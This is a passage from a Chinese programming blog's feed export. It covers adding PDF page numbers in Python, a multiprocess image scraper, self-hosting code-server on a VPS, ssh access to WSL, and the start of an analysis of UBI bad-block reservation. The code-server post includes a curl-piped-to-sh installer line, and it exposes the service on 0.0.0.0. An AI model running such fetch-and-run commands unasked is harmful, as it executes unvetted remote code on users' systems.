title="代码实现"></a>代码实现</h2><p>添加页码思路如下：</p><ol><li>使用<code>PyPDF2</code>打开待添加页码的PDF, 记录总页数</li><li>使用<code>reportlab</code>创建只带有页码的临时PDF，页面数量与待修改文件一致</li><li>将临时PDF和待修改PDF合并在一起</li><li>保存合并以后的PDF文件</li></ol><p>具体实现如下：</p><h3 id="创建临时PDF"><a href="#创建临时PDF" class="headerlink" title="创建临时PDF"></a>创建临时PDF</h3><p>使用<code>reportlab</code>创建PDF，每个页面对应一个画布<code>canvas</code>，创建页面的过程就像是在画布上画画，把页码画在指定的位置，A4纸张210mm*297mm，以画布左下角为原点，那么页码的坐标大概是 (210/2-1, 4) = (104, 4), 单位mm</p><p>下面的函数就是在已知总页面数的情况下逐页绘制页码，然后保存至tmp文件中。</p><pre><code class="py">from reportlab.lib.units import mmfrom reportlab.pdfgen import canvasfrom reportlab.pdfbase import pdfmetricsfrom reportlab.pdfbase.ttfonts import TTFontdef create_pdf_with_pagenumber(tmp, num):    &#39;&#39;&#39;create tmp pdf that only include page number&#39;&#39;&#39;    pdfmetrics.registerFont(        TTFont(&#39;Times-New-Roman&#39;, &#39;C:\\Windows\\Fonts\\times.ttf&#39;))    c = canvas.Canvas(tmp)    for i in range(num):        c.setFont(&#39;Times-New-Roman&#39;, 10)        c.drawString((104)*mm, (4)*mm, str(i + 1))        c.showPage()    c.save()</code></pre><h3 id="合并PDF"><a href="#合并PDF" class="headerlink" title="合并PDF"></a>合并PDF</h3><p>合并PDF主要用到的是<code>PyPDF2</code>的PdfFileWriter, PdfFileReader, 一个写，一个读。合并过程很简单，打开文件，逐页读取(getPage)，使用mergePage合并两个PDF的对应页面，然后将合并后的页面写入(addPage)到输出文件中。</p><pre><code class="py">from PyPDF2 import PdfFileWriter, PdfFileReaderpath = &#39;release_notes.pdf&#39;tmp = &quot;tmp.pdf&quot;dst_pdf = PdfFileWriter()with open(path, &#39;rb&#39;) as f:    src_pdf = PdfFileReader(f, strict=False)    n = src_pdf.getNumPages()    create_pdf_with_pagenumber(tmp, n)    with open(tmp, &#39;rb&#39;) as ftmp:        num_pdf = PdfFileReader(ftmp)        for i in range(n):            print(&#39;page: %d of %d&#39; % (i+1, n))            page = src_pdf.getPage(i)            num_layer = num_pdf.getPage(i)            page.mergePage(num_layer)            dst_pdf.addPage(page)    if dst_pdf.getNumPages():        output = &#39;&#123;&#125;_new.pdf&#39;.format(path.split(&#39;.&#39;)[0])        with open(output, &#39;wb&#39;) as f:            dst_pdf.write(f)    os.remove(tmp)</code></pre><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-&#39;&#39;&#39;add page number to pdf file&#39;&#39;&#39;import sysimport osimport reportlabfrom reportlab.lib.units import mmfrom reportlab.pdfgen import canvasfrom reportlab.pdfbase import pdfmetricsfrom reportlab.pdfbase.ttfonts import TTFontfrom PyPDF2 import PdfFileWriter, PdfFileReaderdef create_pdf_with_pagenumber(tmp, num):    &#39;&#39;&#39;create tmp pdf that only include page number&#39;&#39;&#39;    pdfmetrics.registerFont(        TTFont(&#39;Times-New-Roman&#39;, &#39;C:\\Windows\\Fonts\\times.ttf&#39;))    c = canvas.Canvas(tmp)    for i in range(num):        c.setFont(&#39;Times-New-Roman&#39;, 10)        c.drawString((104)*mm, (4)*mm, str(i + 1))        c.showPage()    c.save()def main():    path = &#39;release_notes.pdf&#39;    if len(sys.argv) == 1:        if not os.path.isfile(path):            sys.exit(1)    else:        path = os.path.basename(sys.argv[1])    tmp = &quot;tmp.pdf&quot;    dst_pdf = PdfFileWriter()    with open(path, &#39;rb&#39;) as f:        src_pdf = PdfFileReader(f, strict=False)        n = src_pdf.getNumPages()        create_pdf_with_pagenumber(tmp, n)        with open(tmp, &#39;rb&#39;) as ftmp:            num_pdf = PdfFileReader(ftmp)            for i in range(n):                print(&#39;page: %d of %d&#39; % (i+1, n))                page = src_pdf.getPage(i)                num_layer = num_pdf.getPage(i)                page.mergePage(num_layer)                dst_pdf.addPage(page)        if dst_pdf.getNumPages():            output = &#39;&#123;&#125;_new.pdf&#39;.format(path.split(&#39;.&#39;)[0])            with open(output, &#39;wb&#39;) as f:                dst_pdf.write(f)        os.remove(tmp)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>使用很简单</p><pre><code class="bash">python3 main.py filename.pdf</code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://gist.github.com/DIYer22/b9ede6b5b96109788a47973649645c1f">https://gist.github.com/DIYer22/b9ede6b5b96109788a47973649645c1f</a></li><li><a href="https://www.reportlab.com/docs/reportlab-userguide.pdf">ReportLab PDF Library User Guide.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pdf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫8 - 爬取彼岸图网美图</title>
      <link href="2020/08/09/netbian/"/>
      <url>2020/08/09/netbian/</url>
      
        <content type="html"><![CDATA[<p><a href="http://pic.netbian.com/">彼岸图网</a>收集了大量美图，是个不错的爬取对象。话不多说，直接上图。</p><p><img src="/assets/netbian/netbian.png" alt="彼岸图网"></p><h2 id="分析站点"><a href="#分析站点" class="headerlink" title="分析站点"></a>分析站点</h2><h3 id="分类列表"><a href="#分类列表" class="headerlink" title="分类列表"></a>分类列表</h3><p>爬取之前，自然要分析一波，这个站点的框架比较简单，从分类着手，共包含12个分类项。</p><ol><li>4K人物</li><li>4K动漫</li><li>4K动物</li><li>4K宗教</li><li>4K影视</li><li>4K明星</li><li>4K汽车</li><li>4K游戏</li><li>4K美女</li><li>4K美食</li><li>4K背景</li><li>4K风景</li></ol><p>名称都含有4K，但是获取原图是需要会员的，所以我这里获取的不是原图，而是详细页展示的大图。首先要获取的当然是分类页面的网址，看下面的DOM.</p><p><img src="/assets/netbian/categories.png" alt="分类信息"></p><p>通过<code>xpath</code> <code>//div[contains(@class, &quot;classify&quot;)]/a</code> 可以得到分类链接信息，从而可以得到分类名称和网址。</p><h3 id="缩略图列表"><a href="#缩略图列表" class="headerlink" title="缩略图列表"></a>缩略图列表</h3><p>接下来以<code>4k影视</code>为例，解析每个分类页面，从分类页面可以看到图片的缩略图列表，点击缩略图就能进入详细页面看到大图。</p><p><img src="/assets/netbian/category.png" alt="4k影视"></p><p>缩略图列表中的图片链接可以通过<code>xpath</code> <code>//div[@class=&quot;slist&quot;]//a/@href</code> 获得。</p><p>此外，分类页面包含大量图片，是通过分页展示的，分页的页数可以从页面尾部看到。</p><p><img src="/assets/netbian/pages_num.png" alt="分类页面页码"></p><p>页面数量可以通过<code>xpath</code> <code>//span[@class=&quot;slh&quot;]/following-sibling::a[1]/text()</code>获得，也就是<code>...</code>后的同胞元素。</p><h3 id="大图页面"><a href="#大图页面" class="headerlink" title="大图页面"></a>大图页面</h3><p>最后就是通过缩略图访问的大图页面了，根据大图的<code>id</code>信息，其实际链接可以通过<code>xpath</code> <code>//*[@id=&quot;img&quot;]/img/@src</code>获得。</p><p><img src="/assets/netbian/image.png" alt="大图"></p><p>到此，整个网站已经分析完成。</p><h2 id="爬取方案"><a href="#爬取方案" class="headerlink" title="爬取方案"></a>爬取方案</h2><p>根据分析过程可以很容易想到爬取步骤：</p><ol><li>获取分类信息，包括名称和链接</li><li>根据分类链接爬取缩略图信息，逐页爬取</li><li>逐页爬取过程中，获取大图实际链接</li><li>下载大图到本地</li></ol><p>为了加速爬取过程，我们可以使用多进程，使用Python中的进程池<code>Pool</code>即可。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>下面通过代码进行实现，为了方便资源共享，减少全局变量或参数传递，我将爬虫封装成一个类<code>Netbian_Spider</code>. 将主页网址和爬虫所需的<code>UA</code>放到初始化信息中。</p><pre><code class="python">class Netbian_Spider(object):    def __init__(self):        self.index = &#39;http://pic.netbian.com&#39;        self.headers = &#123;            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36&#39;        &#125;</code></pre><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p>在类中，可以先按爬取步骤定义好成员函数，当然在编码过程中可以依情况进行增删改。</p><pre><code class="python">    def get_path(self, name):        pass    def get_categories(self):        &#39;&#39;&#39;get categories of website&#39;&#39;&#39;        pass    def spider_by_category(self, category, url):        &#39;&#39;&#39;Process function which use to capture images base on category&#39;&#39;&#39;        pass    def parse_thumb_page(self, url, first_page=False):        &#39;&#39;&#39;parse thumbnail page and get all the detail pages url&#39;&#39;&#39;        pass    def parse_detail_page(self, url):        &#39;&#39;&#39;parse detail page and get source image url&#39;&#39;&#39;        pass    def download_image(self, url, path):        pass</code></pre><p>下面对爬虫的实现过程进行详细说明。</p><h3 id="保存路径"><a href="#保存路径" class="headerlink" title="保存路径"></a>保存路径</h3><p>首先确定图片的保存路径，根目录为<code>~/Pictures/python/netbian</code>，<code>windows</code>对应用户默认的图片目录，<code>linux</code>用户也是同样。</p><p>调用<code>get_path</code>会在根目录下会根据分类名称<code>name</code>新建子文件夹。</p><pre><code class="python">    def get_path(self, name):        home_path = os.path.expanduser(&#39;~&#39;)        path = os.path.join(home_path, &#39;Pictures/python/netbian/&#39; + name)        if not os.path.isdir(path):            os.makedirs(path)        return os.path.realpath(path)</code></pre><h3 id="获取分类信息"><a href="#获取分类信息" class="headerlink" title="获取分类信息"></a>获取分类信息</h3><p>按照前面的分类，爬虫第一步是爬取分类信息，我们使用<code>yield</code>定义一个<strong>生成器</strong>，逐个返回获取到的分类名称和分类网址。</p><pre><code class="python">    def get_categories(self):        &#39;&#39;&#39;get categories of website&#39;&#39;&#39;        res = requests.get(self.index, headers=self.headers)        doc = html.fromstring(res.content)        categories = doc.xpath(&#39;//div[contains(@class, &quot;classify&quot;)]/a&#39;)        for category in categories:            name = category.xpath(&#39;text()&#39;)[0]            url = category.xpath(&#39;@href&#39;)[0]            yield name, url</code></pre><h3 id="按分类逐页爬取"><a href="#按分类逐页爬取" class="headerlink" title="按分类逐页爬取"></a>按分类逐页爬取</h3><p>得到分类页面<code>url</code>后，通过后续实现的<code>page_thumb_page</code>解析分类页面得到</p><ol><li>大图详细页面链接<code>detail_pages</code></li><li>每个分类的总页面数量<code>page_cnt</code></li></ol><p>之后就逐页爬取大图并下载到本地，直到所有页面都爬取完成。</p><pre><code class="python">    def spider_by_category(self, category, url):        &#39;&#39;&#39;Process function which use to capture images base on category&#39;&#39;&#39;        path_category = self.get_path(category)        detail_pages, page_cnt = self.parse_thumb_page(url, first_page=True)        img_cnt = 0        page_num = 1        while True:            for page in detail_pages:                img_cnt += 1                print(&#39;[&#123;&#125; page-&#123;&#125; img-&#123;&#125;] Parsing page &#123;&#125;&#39;.format(                    category, page_num, img_cnt, page))                img_url = self.parse_detail_page(page)                self.download_image(img_url, path_category)            page_num += 1            if page_num &gt; page_cnt:                break            detail_pages = self.parse_thumb_page(                &#39;&#123;&#125;index_&#123;&#125;.html&#39;.format(url, page_num))</code></pre><h3 id="解析缩略图"><a href="#解析缩略图" class="headerlink" title="解析缩略图"></a>解析缩略图</h3><p>在分类页面，也就是缩略图页面，通过前面提及的<code>xpath</code>可以得到所有缩略图对应大图的链接。此外，如果是当前分类的首页，还需要返回分页数。</p><pre><code class="python">    def parse_thumb_page(self, url, first_page=False):        &#39;&#39;&#39;parse thumbnail page and get all the detail pages url&#39;&#39;&#39;        res = requests.get(self.index + url, headers=self.headers)        doc = html.fromstring(res.content)        detail_pages = doc.xpath(&#39;//div[@class=&quot;slist&quot;]//a/@href&#39;)        if first_page:            page_cnt = doc.xpath(                &#39;//span[@class=&quot;slh&quot;]/following-sibling::a[1]/text()&#39;)[0]            return detail_pages, int(page_cnt)        else:            return detail_pages</code></pre><h3 id="下载大图"><a href="#下载大图" class="headerlink" title="下载大图"></a>下载大图</h3><p>大图页面的解析也是一个<code>xpath</code>就搞定了，然后通过<code>requests</code>下载到本地指定路径就ok啦。</p><pre><code class="python">    def parse_detail_page(self, url):        &#39;&#39;&#39;parse detail page and get source image url&#39;&#39;&#39;        res = requests.get(self.index + url, headers=self.headers)        doc = html.fromstring(res.content)        img_url = doc.xpath(&#39;//*[@id=&quot;img&quot;]/img/@src&#39;)[0]        return img_url    def download_image(self, url, path):        img_name = url.split(&#39;/&#39;)[-1]        save_path = os.path.join(path, img_name)        res = requests.get(self.index + url, headers=self.headers, timeout=20)        if res.status_code == 200:            with open(save_path, &#39;wb&#39;) as f:                f.write(res.content)</code></pre><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>主函数用到的最关键的知识点就是进程池<code>Pool</code>，使用Pool创建多进程，进程数量由<code>multiprocessing.cpu_conut()</code>决定，也就是PC包含的CPU数量。</p><p>主函数首先创建<code>Netbian_Spider</code>类的对象<code>spider</code>，然后获取分类信息。进程池中，每个进程处理一个分类，共12个进程，每次最多执行<code>cpu_count()</code>个进程，剩下的需要前面至少一个执行结束才会开始。</p><pre><code class="python">def main():    spider = Netbian_Spider()    categories = spider.get_categories()    p = Pool(cpu_count())    for name, url in categories:        p.apply_async(spider.spider_by_category, args=(name, url))    p.close()    p.join()    print(&#39;All Done!&#39;)if __name__ == &quot;__main__&quot;:    main()</code></pre><h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p>使用<code>python3</code>爬取彼岸图网，共爬取图片17796张，9.18G</p><p><img src="/assets/netbian/captureing.png" alt="爬取测试"></p><p><img src="/assets/netbian/captured.png" alt="爬取结果"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>该爬虫源码已放置Github项目<a href="https://github.com/Litreily/capturer">capturer</a>，欢迎交流。</p><p>此外，爬取图片仅供学习，不得商用哦。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
            <tag> xpath </tag>
            
            <tag> pool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS搭建在线VSCode Server</title>
      <link href="2020/06/13/code-server/"/>
      <url>2020/06/13/code-server/</url>
      
        <content type="html"><![CDATA[<h2 id="VSCode-Server"><a href="#VSCode-Server" class="headerlink" title="VSCode Server"></a>VSCode Server</h2><p>VSCode(Visual Studio Code), 是我目前使用过的最好的编辑器，也应该是很多程序员的首选。然而很多人不知道的是，这款开发利器还有在线版，这包括GitHub即将推出的<code>Satellite</code>, 也会搭载VSCode，那么如果我们想要搭建自己的在线开发环境呢？答案就是<a href="https://github.com/cdr/code-server">Code Server</a>, 一款可以部署在个人服务器上的VSCode服务。</p><p><img src="/assets/vscode/pods-lg.png" alt="pods logo"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>如果在本地，自然是无需搭建这个server的，我的选择是放在阿里云服务器上，对应的是Ubuntu系统，安装过程非常简单。</p><pre><code class="zsh">curl -fsSL https://code-server.dev/install.sh |sh</code></pre><p>安装完会给出提示该怎么操作，其它系统可以参考<a href="https://github.com/cdr/code-server/blob/master/doc/guide.md">官方文档</a>。</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>使用<code>systemctl</code>启动服务，并保证系统重启可以自启动服务，可以执行以下指令：</p><pre><code class="zsh">systemctl --user enable --now code-server</code></pre><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>VSCode服务有一个配置文件<code>~/.config/code-server/config.yaml</code>，默认配置包含：</p><pre><code class="yaml">bind-addr: 127.0.0.1:8080auth: passwordpassword: somerandominfocert: false</code></pre><p>默认情况下开启了密码认证，同时给了一个初始密码。我们可以将端口号和密码都修改成自己想要的。修改完成以后，记得重启服务。</p><pre><code class="zsh">systemctl --user restart code-server</code></pre><h2 id="VPS安全组"><a href="#VPS安全组" class="headerlink" title="VPS安全组"></a>VPS安全组</h2><p>如果使用的是VPS，默认情况下是会将除ssh以外的其它端口都屏蔽的，所以我们需要在服务器的控制台修改安全组。</p><p><img src="/assets/vscode/vps-port.png" alt="VPS 安全组"></p><p>但是添加以后还是无法访问，后来谷歌后发现是配置问题，上面的<code>127.0.0.1</code>只是针对本地地址，无法被外部网络访问，因此，解决方案就是将<code>127.0.0.1</code>改为<code>0.0.0.0</code>，然后重启服务。</p><h2 id="实例展示"><a href="#实例展示" class="headerlink" title="实例展示"></a>实例展示</h2><p>通过配置好的端口访问VPS的Code Server，首先进入登录页面，输入配置的密码即可。</p><p><img src="/assets/vscode/code-login.png" alt="登录 Code Server"></p><p>好啦，基本和本地的一毛一样，目前尝试过程发现无法复制网页外的其它数据，终端无法使用<code>Ctrl-L</code>清空，算是小瑕疵吧，不过真的超棒，我想，针对需要出差的人群算是福音了。</p><p><img src="/assets/vscode/code-server.png" alt="Code Server"></p><p>首次运行会比较慢，当然可能是我的网速问题，加载一个大型<code>js</code>文件<code>workbench.web.api.js</code>占据了大量时间，在启用浏览器缓存的情况下，往后启动就更快了。</p><p>另外，如果有域名的话，可以按照官方教程安装<a href="https://github.com/cdr/code-server/blob/master/doc/guide.md#lets-encrypt">Let&#39;s Encrypt.</a>证书，然后通过<code>https</code>访问，这样更加安全。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> vps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10中使用ssh访问WSL</title>
      <link href="2020/05/08/putty-wsl/"/>
      <url>2020/05/08/putty-wsl/</url>
      
        <content type="html"><![CDATA[<p>win10的WSL作为目前日常必备，实在是爱不释手，奈何默认终端界面实在一言难尽，尽管配色问题可以解决，但是字体问题导致ohmyzsh的很多图标无法正常显示，配置好<a href="https://github.com/powerline/fonts">powerline</a>字体略有改善，但配合tmux使用又会出现乱码问题，实在难以忍受，于是准备通过ssh间接访问。</p><h2 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h2><p>重装<code>openssh-server</code>, 如果自带的没问题也不用重装。</p><pre><code class="zsh">sudo apt remove openssh-serversudo apt install openssh-server</code></pre><p>修改<code>/etc/ssh/sshd_config</code></p><pre><code class="zsh"># 服务端每分钟发送一次数据包给客户端，客户端回复即保持连接ClientAliveInterval 60# 客户端3次未响应则断开ClientAliveCountMax 3# 开启密码认证，拒绝空密码PasswordAuthentication yesPermitEmptyPasswords no</code></pre><p>手动启动ssh, 可以用以下方法，二选一</p><pre><code class="zsh">sudo service ssh startsudo /etc/init.d/ssh start</code></pre><h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><p>为了保证每次开机可以直接通过putty打开WSL，需要开机自启动ssh，怎么实现呢，参考知乎文章 <a href="https://zhuanlan.zhihu.com/p/47733615">WSL 服务自动启动的正确方法</a> ，简单整理如下：</p><ul><li><code>Win R</code>运行<code>shell:startup</code>打开windows的自启动目录</li><li>添加脚本<code>wsl.vbs</code>, 输入以下信息然后保存文件</li></ul><pre><code class="vbs">Set ws = CreateObject(&quot;Wscript.Shell&quot;)ws.run &quot;wsl -d ubuntu -u root /etc/init.d/ssh start&quot;, vbhide</code></pre><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>安装 <a href="https://github.com/tonsky/FiraCode">Fira code</a> 字体，超46k的star，还是很强大的。安装后修改下putty和VSCode的字体。</p><ul><li>putty，打开settings，选择Window-&gt;Appearance-&gt;Font settings, 设置<code>Fira code</code>字体。</li><li>VSCode，打开settings，搜索&quot;font family&quot;，在已有字体中加入<code>Fira Code Retina</code>字体。</li></ul><p><img src="/assets/vscode/vscode-font.png" alt="VSCode Font family"></p><p>配置VSCode的原因是VSCode本身也可以使用WSL，所以字体方面也可以进行修正。</p><h2 id="putty"><a href="#putty" class="headerlink" title="putty"></a>putty</h2><p>putty除了配置字体外，还可以配置<code>Alt-Enter</code>全屏快捷键，当然最主要的还是配置连接WSL的ssh. 由于是本机，使用localhost或者<code>127.0.0.1</code>就可以。</p><p><img src="/assets/putty/putty-wsl.png" alt="putty wsl"></p><p>同时配置下默认用户名，可以免去每次打开时输入用户名的麻烦。</p><p><img src="/assets/putty/putty-data.png" alt="putty default user"></p><p>最后来看下连接后的效果</p><p><img src="/assets/putty/putty-tmux.png" alt="putty tmux"></p><p>好啦，完结撒花~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/47733615">WSL 服务自动启动的正确方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> putty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 内核驱动解析 - UBI坏块预留大小</title>
      <link href="2020/05/07/ubi-driver/"/>
      <url>2020/05/07/ubi-driver/</url>
      
        <content type="html"><![CDATA[<p>在处理ubifs相关bug的过程中，学习了ubi驱动对坏块保留分区的处理方式，在此记录一下。</p><p><img src="/assets/linux/ubi-reserved-maps.png" alt="ubi reserved mind maps"></p><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="mtd"><a href="#mtd" class="headerlink" title="mtd"></a>mtd</h3><p><strong>mtd</strong> 全称 memory technology device 内存技术设备，是用于访问内存设备(RAM, Flash)的Linux 子系统，在硬件层和用户空间之间提供抽象接口。</p><p>在嵌入式linux设备中的<code>/dev/</code>目录下有很多<code>/dev/mtdxx</code>文件，这些文件对应的就是内存设备。比如，嵌入式设备的Nand Flash被划分为多个分区，每个分区对应一个<code>/dev/mtdxx</code>文件。</p><p>如下所示，<code>/dev/mtd0</code>至<code>/dev/mtd10</code>对应uboot分区，<code>mtd21</code>对应固件分区，<code>mtd20</code>就是本文将要用到的数据分区。</p><pre><code class="sh">root:/dev# ls mtd* |grep -v blockmtd0        mtd16ro     mtd23ro     mtd30romtd0ro      mtd17       mtd24       mtd31mtd1        mtd17ro     mtd24ro     mtd31romtd10       mtd18       mtd25       mtd3romtd10ro     mtd18ro     mtd25ro     mtd4mtd11       mtd19       mtd26       mtd4romtd11ro     mtd19ro     mtd26ro     mtd5mtd12       mtd1ro      mtd27       mtd5romtd12ro     mtd2        mtd27ro     mtd6mtd13       mtd20       mtd28       mtd6romtd13ro     mtd20ro     mtd28ro     mtd7mtd14       mtd21       mtd29       mtd7romtd14ro     mtd21ro     mtd29ro     mtd8mtd15       mtd22       mtd2ro      mtd8romtd15ro     mtd22ro     mtd3        mtd9mtd16       mtd23       mtd30       mtd9roroot:/dev#root:/dev# cat /proc/mtddev:    size   erasesize  namemtd0: 00100000 00020000 &quot;0:SBL1&quot;mtd1: 00100000 00020000 &quot;0:MIBIB&quot;mtd2: 00100000 00020000 &quot;0:BOOTCONFIG&quot;...mtd7: 00080000 00020000 &quot;0:BOOTCONFIG1&quot;mtd8: 00080000 00020000 &quot;0:APPSBLENV&quot;mtd9: 00200000 00020000 &quot;0:APPSBL&quot;mtd10: 00200000 00020000 &quot;0:APPSBL_1&quot;mtd11: 00080000 00020000 &quot;0:ART&quot;mtd12: 00080000 00020000 &quot;0:ART.bak&quot;mtd13: 00100000 00020000 &quot;config&quot;mtd14: 00080000 00020000 &quot;data1&quot;mtd15: 00040000 00020000 &quot;data2&quot;...mtd20: 01e00000 00020000 &quot;mtddata&quot;mtd21: 02800000 00020000 &quot;firmware&quot;...mtd25: 02780000 00020000 &quot;reserved&quot;</code></pre><h3 id="ubi"><a href="#ubi" class="headerlink" title="ubi"></a>ubi</h3><p><strong>ubi</strong> 是Unsorted Block Image的简称，ubifs是Unsorted Block Image File System(无序区块镜像文件系统)的简称，构建于MTD之上，可操控大容量的Nand flash.</p><p>nand flash, mtd 和ubifs三者关系可以简述为：nand flash作为硬件设备，mtd介于硬件设备和用户层间提供抽象接口，ubifs是在mtd之上构建的文件系统，方便对nand flash进行数据读写。</p><p>ubi相关概念有:</p><ul><li>PEB: physical eraseblock, 物理擦除块，通常为128KB(131072 Bytes)</li><li>LEB: logical eraseblock, 逻辑擦除块，通常为124KB(126976 Bytes)</li></ul><blockquote><p><strong>UBI Headers</strong><br>UBI stores 2 small 64-byte headers at the beginning of each non-bad physical eraseblock:  </p><ul><li>erase counter header (or <strong>EC</strong> header) which contains the erase counter of the physical eraseblock (PEB) plus other information;</li><li>volume identifier header (or <strong>VID</strong> header) which stores the volume ID and the logical eraseblock (LEB) number to which this PEB belongs.</li></ul></blockquote><p>从字面意思也可以理解，LEB是逻辑块，PEB是物理块，实际上LEB包含于PEB，通常LEB会比PEB小4KB，其中2KB用于存储VID Headers, 另外2KB是偏移量，用于对齐。</p><h2 id="console-log"><a href="#console-log" class="headerlink" title="console log"></a>console log</h2><p>了解了相关概念，接下来从嵌入式设备的console log看看UBI相关的信息，依据log可以方便在用户空间或者内核空间搜索相关信息，定位到与之相关的代码。</p><h3 id="UBI-attach"><a href="#UBI-attach" class="headerlink" title="UBI attach"></a>UBI attach</h3><p>首先来看下嵌入式linux设备开机过程中UBI设备的加载信息</p><pre><code class="zsh">Info: init ubi volumes on mtddata raw partitionUBI: attaching mtd20 to ubi0random: procd: uninitialized urandom read (4 bytes read, 60 bits of entropy available)UBI: scanning is finishedUBI: attached mtd20 (name &quot;mtddata&quot;, size 30 MiB) to ubi0UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytesUBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048UBI: VID header offset: 2048 (aligned 2048), data offset: 4096UBI: good PEBs: 240, bad PEBs: 0, corrupted PEBs: 0UBI: user volume: 5, internal volumes: 1, max. volumes count: 128UBI: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 860068978UBI: available PEBs: 3, total reserved PEBs: 237, PEBs reserved for bad PEB handling: 20UBI: background thread &quot;ubi_bgt0d&quot; started, PID 115UBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 3 LEBs (380928 bytes, 372.0 KiB), LEB size 126976 bytes (124.0 KiB)Info: attach ubi device on mtddata success!</code></pre><p>以上信息绝大部分在内核UBI驱动的<code>build.c/ubi_attach_mtd_dev</code>函数中打印输出，下面内核空间部分会讲到。</p><p>下面分析其中几条主要信息：</p><pre><code class="zsh"># 在 mtddata 原始分区初始化 ubi 卷Info: init ubi volumes on mtddata raw partition# 将mtd20附加到ubi0...UBI: attaching mtd20 to ubi0# 将mtd20附加到ubi0 完成UBI: attached mtd20 (name &quot;mtddata&quot;, size 30 MiB) to ubi0# PEB 128KB, LEB 124KBUBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes# 最小最大I/O读写单元：2048/2048, subpage 2048, 就是2KBUBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048# VID header偏移量2KB，用于对齐，数据偏移量4KBUBI: VID header offset: 2048 (aligned 2048), data offset: 4096# 240 pebs正常，无坏块UBI: good PEBs: 240, bad PEBs: 0, corrupted PEBs: 0# 剩余可用3 PEBs, 总保留 237 PEBs(已用或保留)，用于坏块处理的保留PEBs 20（本文讨论重点）UBI: available PEBs: 3, total reserved PEBs: 237, PEBs reserved for bad PEB handling: 20# UBI 设备号0，共240 LEBs（29.1MB)，剩余可用3 LEBs，每个LEB大小为124KBUBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 3 LEBs (380928 bytes, 372.0 KiB), LEB size 126976 bytes (124.0 KiB)# 成功在mtddata附加ubi设备Info: attach ubi device on mtddata success!</code></pre><p>从log中可以知晓很多关键信息，UBI挂载的分区名称为mtddata，对应mtd20; PEB 128KB， LEB 124KB; ubi0共240 LEBs/PEBs, 剩余可以3 LEBs/PEBs, 无坏块; 用于坏块处理的保留部分为20 PEBs, 本文后续将要介绍的就是这个保留20 PEBs是如何得来的。</p><h3 id="ubinfo-a"><a href="#ubinfo-a" class="headerlink" title="ubinfo -a"></a>ubinfo -a</h3><p>开机过程会自动打印UBI的信息，那开机后如何手动获取呢，这就要用到ubi相关的工具集了，ubi相关的指令包含：</p><pre><code class="zsh">root:/# ubiubiattach     ubidetach     ubinfo        ubirmvolubiblock      ubiformat     ubinize       ubirsvolubicrc32      ubimkvol      ubirename     ubiupdatevol</code></pre><p>其中的<code>ubinfo</code>就可以查看ubi信息</p><pre><code class="sh">root:/# ubinfo -aUBI version:                    1Count of UBI devices:           1UBI control device major/minor: 10:60Present UBI devices:            ubi0ubi0Volumes count:                           5Logical eraseblock size:                 126976 bytes, 124.0 KiBTotal amount of logical eraseblocks:     240 (30474240 bytes, 29.1 MiB)Amount of available logical eraseblocks: 3 (380928 bytes, 372.0 KiB)Maximum count of volumes                 128Count of bad physical eraseblocks:       0Count of reserved physical eraseblocks:  20Current maximum erase counter value:     2Minimum input/output unit size:          2048 bytesCharacter device major/minor:            249:0Present volumes:                         0, 1, 2, 3, 4...</code></pre><p>ubi0包含5个分卷，最多可包含128个分卷，其它基本信息与开机过程中内核打印的信息一致，本文主要关心下面这一条信息。</p><pre><code class="sh">Count of reserved physical eraseblocks:  20</code></pre><p>好啦，到此就获取并分析了最直观的log信息，下面将从用户空间和内核空间两个维度来追溯这个20 PEBs是怎么来的。</p><h2 id="用户空间"><a href="#用户空间" class="headerlink" title="用户空间"></a>用户空间</h2><p>在用户空间的ubi-utils代码库中搜索“Count of reserved physical eraseblocks”，就可以定位到函数<code>ubinfo.c/print_dev_info</code></p><h3 id="print-dev-info"><a href="#print-dev-info" class="headerlink" 